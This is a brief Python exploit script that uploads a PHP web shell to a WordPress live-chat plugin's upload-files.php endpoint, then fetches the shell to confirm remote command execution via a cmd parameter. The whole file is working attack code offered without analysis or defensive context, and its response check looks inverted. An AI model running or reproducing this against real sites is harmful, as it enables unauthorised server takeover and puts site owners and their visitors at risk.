import requests

def exploit(site):
    upload_url = f"{site}/wp-content/plugins/wp-live-chat-support/upload-files.php"
    files = {
        'file': ('shell.php', '<?php echo "ALT_RCE_OK"; system($_GET["cmd"]); ?>', 'application/x-php')
    }
    r = requests.post(upload_url, files=files, timeout=10)
    if r.status_code == 200 and "ALT_RCE_OK" not in r.text:
        check_url = f"{site}/wp-content/uploads/shell.php"
        r2 = requests.get(check_url, timeout=10)
        if r2.status_code == 200:
            return True, check_url + "?cmd=whoami"
    return False, None
